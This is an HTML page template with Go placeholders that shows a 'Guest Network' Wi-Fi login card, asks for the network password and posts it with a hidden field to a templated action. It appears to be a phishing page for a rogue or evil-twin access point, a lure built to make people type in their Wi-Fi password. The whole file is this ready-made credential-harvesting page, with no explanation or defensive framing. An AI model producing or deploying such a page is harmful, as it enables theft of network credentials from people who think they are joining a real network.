<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Connect to Wi-Fi</title>
<style>
  body { font-family: -apple-system, "Segoe UI", Roboto, Arial, sans-serif; background: #ede7f6; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
  .card { background: #fff; width: 400px; padding: 40px; border-radius: 10px; box-shadow: 0 4px 16px rgba(0,0,0,.12); text-align: center; }
  .wifi { font-size: 44px; margin-bottom: 8px; }
  h1 { font-size: 20px; margin: 0 0 6px; color: #311b92; }
  .sub { color: #5e35b1; font-size: 13px; margin-bottom: 22px; }
  form { text-align: left; }
  label { display: block; font-size: 13px; color: #4527a0; margin: 12px 0 4px; }
  input { width: 100%; box-sizing: border-box; padding: 12px; border: 1px solid #b39ddb; border-radius: 6px; font-size: 15px; }
  button { width: 100%; margin-top: 20px; padding: 12px; border: 0; border-radius: 6px; background: #4527a0; color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; }
  .ssid { font-size: 14px; color: #311b92; font-weight: 600; margin-bottom: 4px; }
</style>
</head>
<body>
<div class="card">
  <div class="wifi">&#128275;</div>
  <h1>Guest Network</h1>
  <p class="sub">This Wi-Fi network is protected. Enter the password to connect.</p>
  <div class="ssid">Network: {{.Orig}}</div>
  <form method="post" action="{{.Action}}">
    <input type="hidden" name="orig" value="{{.Orig}}">
    <label>Password</label>
    <input type="password" name="password" placeholder="Wi-Fi password" required autofocus>
    <button type="submit">Connect</button>
  </form>
</div>
</body>
</html>
